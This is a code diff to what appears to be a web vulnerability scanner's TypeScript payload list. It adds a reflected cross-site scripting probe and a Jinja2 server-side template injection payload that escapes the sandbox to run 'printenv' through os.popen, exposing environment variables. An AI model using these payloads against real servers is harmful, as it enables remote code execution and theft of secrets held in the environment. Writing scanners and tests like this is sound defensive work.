@@ -60,6 +60,16 @@ export const defaultPayloads: PayloadsT = // TODO: payloads.jsonから読み込�
         unexpected: ["PyJailBreak_b981a35bde"],
         severity: "critical",
       },
+      {
+        payload: ['name=<script>alert(1)<script>'],
+        unexpected: ["<script>alert(1)<script>"],
+        severity: "critical",
+      },
+      {
+        payload: ['name={{get_flashed_messages.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__["sys"].modules["os"].popen("printenv").read()}}'],
+        unexpected: ["PyJailBreak_b981a35bde"],
+        severity: "critical",
+      },
     ] as PayloadT[]
   ).map((payload: PayloadT, id) => ({
     id: id,
